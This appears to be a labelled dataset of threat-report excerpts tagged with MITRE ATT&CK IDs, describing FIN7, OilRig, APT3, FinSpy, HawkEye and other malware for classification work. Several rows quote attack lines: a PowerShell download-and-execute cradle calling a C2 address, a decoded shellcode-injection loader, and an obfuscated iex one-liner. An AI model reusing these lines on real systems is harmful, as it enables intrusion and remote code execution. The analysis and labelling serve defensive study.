For example, one of these FIN7 LNK files contained the following properties:  Version: 0 NetBIOS name: andy-pc Droid volume identifier: e2c10c40-6f7d-4442-bcec-470c96730bca Droid file identifier: a6eea972-0e2f-11e7-8b2d-0800273d5268 Birth droid volume identifier: e2c10c40-6f7d-4442-bcec-470c96730bca Birth droid file identifier: a6eea972-0e2f-11e7-8b2d-0800273d5268 MAC address: 08:00:27:3d:52:68 UUID timestamp: 03/21/2017 (12:12:28.500) [UTC] UUID sequence number: 2861  From this LNK file, we can see not only what the shortcut launched within the string data, but that the attacker likely generated this file on a VirtualBox system with hostname “andy-pc” on March 21, 2017	['T1070.006', 'T1082', 'T1547.009']
For more information related to HIDDEN COBRA activity, go to https://www.us-cert.gov/hiddencobra.If users or administrators detect the custom tools indicative of HIDDEN COBRA, these tools should be immediately flagged, reported to the DHS National Cybersecurity Communications and Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and given highest priority for enhanced mitigation	['T1518.001', 'T1564.001']
Hardcoded domain “mumbai-m[.]site”  BONDUPDATER will attempt to resolve the resulting DGA domain and will take the following actions based on the IP address resolution:  Create a temporary file in %temp% location The file created will have the last two octets of the resolved IP addresses as its filename	['T1036', 'T1016']
Here is the registry creation:The registry location where persistence is achieved is: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Update	['T1112', 'T1547.001', 'T1012']
If HWP.exe is found running on the system, the malware finds the currently open file in HWP by extracting the file path from the command-line argument passed to HWP.exe This word file (usually named *.hwp) is copied into the temporary file path  C:\DOCUME~1\<username>\LOCALS~1\Temp\2.hwp  hwp is an exact copy of the file loaded into HWP.exe The malware reads the contents of 2.hwp and finds an “MZ magic marker” in the file indicated by the string “JOYBERTM”   Checking for the MZ marker in the HWP file	['T1070.006', 'T1036', 'T1070.004', 'T1074']
If the file does not exist, the Trojan will send the C2 server a message < File Not Found > by sending the following URL:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(“< File Not Found >”)> If the file exists, the Trojan will read the contents of the specified file and compresses the contents using the GZipStream class	['T1070.006', 'T1070.004', 'T1105']
"In the example above, the “spp.exe” executable would be added to an auto-run registry key at: SOFTWARE\Microsoft\Windows\CurrentVersion\Run\iexplore Many of the Fetch samples attempted to obfuscate their functionality by encrypting their embedded strings with AES using the same key “agkrhfpdbvhdhrkj”; however, the loader’s main goal involved running the following command:/c powershell -window hidden -EncodedCommand JAAwAG8AOABlACAAPQAgACcAJABmADkAQgAgAD0AIAAnACcAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABWAGkAcgB0AHUAYQBsAEEAbABsAG8AYwAoAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsA&lt;snip&gt;The base64 encoded command decodes to the following:$0o8e = '$f9B = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $f9B -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = &lt;shellcode REDACTED for brevity&gt;;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rJr=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rJr.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rJr,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($0o8e));$DKn = ""-enc "";if([IntPtr]::Size -eq 8){$b32 = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";iex ""&amp; $b32 $DKn $e""}else{;iex ""&amp; powershell $DKn $e"";}The decoded command above builds a buffer that it uses to store shellcode and creates a thread to execute it"	['T1059.001']
It was also able to use a component of multinational antivirus software Avast to gain information about the target system, as well as a process belonging to Brazilian information security company GAS Tecnologia to gather personal information	['T1518.001', 'T1082']
Japanese Tech Company Taiwanese Government Organizations Organizations in the Asia-Pacific Region that are of Interest to China   The WATERSPOUT backdoor was written to the same file path as the HIGHTIDE backdoors:  C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\word.exe C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\winword.exe   WATERSPOUT was compiled within two days of the last HIGHTIDE backdoor and on the same day as the THREEBYTE backdoor	['T1518.001', 'T1005']
LOWBALL Malware Analysis The spear phishing emails contained three attachments in total, each of which exploited an older vulnerability in Microsoft Office (CVE-2012-0158):  MD5  Filename  b9208a5b0504cb2283b1144fc455eaaa  使命公民運動 我們的異象.doc  ec19ed7cddf92984906325da59f75351  新聞稿及公佈.doc  6495b384748188188d09e9d5a0c401a4  (代發)[采訪通知]港大校友關注組遞信行動.doc   In all three cases, the payload was the same:  MD5  Filename  d76261ba3b624933a6ebb5dd73758db4  time.exe   This backdoor, known as LOWBALL, uses the legitimate Dropbox cloud-storage service to act as the CnC server	['T1036', 'T1598.002', 'T1102']
Once activated, this variant of the KillDisk component looks for and terminates two non-standard processes with the following names:  komut.exe sec_service.exe  We didn’t manage to find any information regarding the name of the first process (komut.exe)	['T1562.001', 'T1036']
Once macros were enabled on the target system, the malicious macros created two named scheduled tasks as persistence mechanisms for two backdoors on the infected system	['T1053.005', 'T1064']
Original File Name Translation Decoy Location Most Likely Target   1060315 本部發言參考.doc 1060315 Headquarters Speech Reference.doc Defense Industry Development Strategy TW Defense   轉給苦逼的網管兄弟.doc Passing to cool fellow network administrators.doc Network administration jokes TW High Tech Telecommunication     2.SC OAM Firewall Policy_0306.xls 2.SC OAM Firewall Policy_0306.xls Network topology diagrams TW High Tech Telecommunication       Figure 3 Decoy document discussing Taiwan’s defense industry development strategy  Figure 4 Network firewall configuration description for a telecommunication company in Taiwan    Figure 5 Decoy document providing network topology information   It is worth noting that in the attack that made use of the decoy document in Figure 4, the attacker also included related firewall logs and appears to have originated from a compromised an IT service vendor	['T1562.001', 'T1021.002']
powershell.exe -exec Bypass -c $s=(get-content C:\\ProgramData\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join(”,$d));  PowerShell one-liner Encoded text file Execution flow:  Case 2: VBS and text files dropped by the macro The VBS file decodes itself and calls mshta.exe, passing on one line of VBScript code to it, which in turn spawns a PowerShell one-liner which finally consumes the text file (usually Base64-encoded text)	['T1140', 'T1036', 'T1059.001']
Previously the fake website linked to the following documents in a third fake Oxford domain, oxford[.]in: http://oxford[.]in/downloads/ls1.doc http://oxford[.]in/downloads/ls2.doc http://oxford[.]in/downloads/ls3.doc http://oxford[.]in/downloads/ls4.do The documents were unavailable during our research, and their content is unknown to us	['T1071', 'T1105']
Regardless of the file extensions, the files dropped by the macro are EITHER INF, SCT and text files OR VBS and text files	['T1070.004', 'T1083']
Second stage shellcode The second stage shellcode will then perform the following actions:  Download the final payload (FinSpy) from hxxp://89.45.67[.]107/rss/mo.exe Download a lure document to display to the victim from the same IP Execute the payload and display the lure document  Payload – mo.exe As mentioned earlier, the “mo.exe” payload (MD5: 4a49135d2ecc07085a8b7c5925a36c0a) is the newest version of Gamma International’s FinSpy malware, typically sold to nation states and other law enforcement agencies to use in lawful surveillance operations.  This newer variant has made it especially difficult for researchers to analyze the malware due to many added anti-analysis techniques, to include a custom packer and virtual machine to execute code	['T1055.012', 'T1064', 'T1105']
Several techniques are employed for executing the PowerShell code: If command starts with “excel”, then it leverages DDEInitiate Method of Excel.Appilcation to execute the code:  If the command starts with “outlook”, then it leverages Outlook.Application and MSHTA to execute the code:  If the command starts with “risk”, then execution is performed through DCOM object:      File upload functionality	['T1106', 'T1140', 'T1059']
SHUTDOWN Shuts down the system using cmd /s /t 0   RESTART Reboots the system using cmd /r /t 0   PROCANDSOFT Lists all active processes and all installed software and uploads the results to the C2 server using a POST command at the “/log.php”	['T1071', 'T1059']
The Check Point IPS blade provides protections against these threats:  Command Injection Over HTTP NoneCMS. ThinkPHP Remote Code Execution (CVE-2018-20062). Oracle WebLogic WLS Security Component Remote Code Execution (CVE-2017-10271). Oracle WebLogic WLS Server Component Arbitrary File Upload (CVE-2018-2894). Hadoop YARN ResourceManager Remote Command Execution. Apache ActiveMQ Fileserver Multi Methods Directory Traversal (CVE-2016-3088). JBoss Seam 2 Framework Remote Code Execution (CVE-2010-1871). JBoss Enterprise Application Platform Invoker Servlets Remote Code Execution (CVE-2012-0874). Red Hat JBoss AS Remote Code Execution.	['T1106', 'T1140', 'T1059', 'T1064', 'T1203', 'T1105', 'T1569.002']
The hook main module contained encrypted strings and handled all the function calls and strings as the references in a large structure	['T1140', 'T1027']
The log files mentioned previously are stored in the same directory as NavRAT on the victim machine, again making it easy for us to find and analyse the additional log files	['T1083', 'T1074', 'T1105']
"The macro carries out this first technique by running the following command:powershell.exe -w hidden -noni -nop -c ""iex(New-Object System.Net.WebClient).DownloadString('hxxp://139.59.46.154:3485/eiloShaegae1')""The code above generates the following HTTP request, which the C2 server would then respond to with a script that PowerShell would execute: GET /eiloShaegae1 HTTP/1.1 Host: 139.59.46[.]154:3485 Connection: Keep-Alive The second method involves using PowerShell to create a thread to execute a buffer of shellcode, which we believe the threat actors obtained from the Magic Unicorn source code"	['T1071', 'T1008', 'T1059.001']
The main module of the Trojan can execute the following commands:  CommandDescription 0x1FSet the dwell time value for the standby mode 0x29Activate the controllers 0x2ASet new configuration data and update the list of command and control servers 0x32Set the dwell time value for the active mode 0x33Set up the plug-in 0x33Save the dwell time values into the database 0x34Activate the plug-ins 0x35Add configuration data 0x36Delete the specified configuration data  The Remote Shell Module can execute the following commands:  CommandDescription 0x66Exit 0x65Open a remote Shell 0x68Verify that the Shell in running 0x67Execute a command  The module, which interacts with the file system, can execute the following commands:  cmdDescription 0x65Find the file(s) 0x66Read the file(s) 0x67Save the file 0x68Remove the file(s) 0x69Run the file(s)  A report on the operations’ execution by this module is displayed as the HTML code	['T1070.006', 'T1140', 'T1059']
These samples communicated with the following hosts via FTP for C2 communication:  ftp.byethost7[.]com ftp.byethost10[.]com files.000webhost[.]com  Beginning in June 2018, we observed the OceanSalt malware family being dropped by CARROTBAT	['T1071', 'T1048']
The subscription was configured to run a PowerShell command that read, decrypted, and executed the backdoor code directly from the new WMI property	['T1140', 'T1059.001']
The threat actor can now combine the information and brute force their way throughout the network (through NetBIOS) using a list of usernames and passwords as well as a range of IP addresses	['T1016', 'T1110']
The Trojan then gets the hexadecimal values of the compressed data and will replace the following hexadecimal values on each line with ASCII characters to further compressed the data:   String of hexadecimal values Character replacement 000000 z 00000 x 0000 y 000 g 00 w 01 t   The Trojan then writes 1500 bytes of the hexadecimal formatted data, one per line to a temporary file in the SpecialFolder.CommonApplicationData folder named as:<day><hour><second><millisecond>.tmp The Trojan will then read each line from this temporary file and send them to the C2 server by issuing requests to a URL structured as follows:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>ABZ<hex(1500 characters of hexadecimal formatted file contents)> Once all of the lines of hexadecimal formatted data in the temporary file are sent to the C2 server, the Trojan will send a request to the C2 server to notify the data has been successfully transmitted via a URL structured as follows:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>ABZFinish  Overlaps with Previous OilRig Group Attacks Since May 2016, we have continued to monitor and uncover various attacks and tools associated with the OilRig group	['T1573', 'T1070.004', 'T1074', 'T1041', 'T1048', 'T1486']
This IP has hosted other domains used by APT3 in past campaigns:  DOMAIN  FIRST SEEN  LAST SEEN  IP ADDRESS  join.playboysplus[.]com  2014-11-21  2014-11-21  104.151.248.173  walterclean[.]com  2014-11-18  2014-11-20  104.151.248.173  www.walterclean[.]com  2014-11-18  2014-11-20  104.151.248.173   As we discussed in our previous blog detailing previous APT3 activity, the walterclean[.]com served as a Plugx/Kaba command and control server	['T1016', 'T1068']
We include a list of observed hardcoded ip C2 addresses here, along with the address owner and geophysical location of the host:    C2 IP address Owner Country   184.22.205.194 hostnoc.net US   5.79.80.166 Leaseweb NL   46.165.222.28 Leaseweb NL   95.211.122.36 Leaseweb NL   46.165.222.101 Leaseweb NL   46.165.222.6 Leaseweb NL   89.149.223.205 Leaseweb NL   85.17.94.134 Leaseweb NL   46.4.28.218 Hetzner DE   78.46.40.239 Hetzner DE   95.143.193.182 Serverconnect SE   188.227.176.74 Redstation GB   93.170.127.100 Nadym RU   37.220.34.56 Yisp NL   194.28.172.58 Besthosting.ua UA   124.217.253.10 PIRADIUS MY   84.19.161.123 Keyweb DE   109.236.88.12 worldstream.nl NL   212.124.110.62 digitalone.com US   5.61.38.31 3nt.com DE   5.255.87.39 serverius.com NL    It’s interesting that one of these servers is a Tor exit node	['T1016', 'T1008']
"When HawkEye is executed, in line 34, byte[] byte_ = gclass.method_0()[""0"", GClass30.GEnum3.RCDATA].Byte_0;it reads the encrypted configuration from the RCDATA resource and in line 33,byte[] byte_2 = GClass29.smethod_12(byte_, GClass12.string_0);and then decrypts this data with the Rijndael algorithm you can see below in the RijndaelManaged function to initialize the HawkEye configuration settings.The decrypted configuration shows us the account used for exfiltration:The main loop of HawkEye has the following functions:This shows the rich feature set of HawkEye"	['T1562.001', 'T1140']
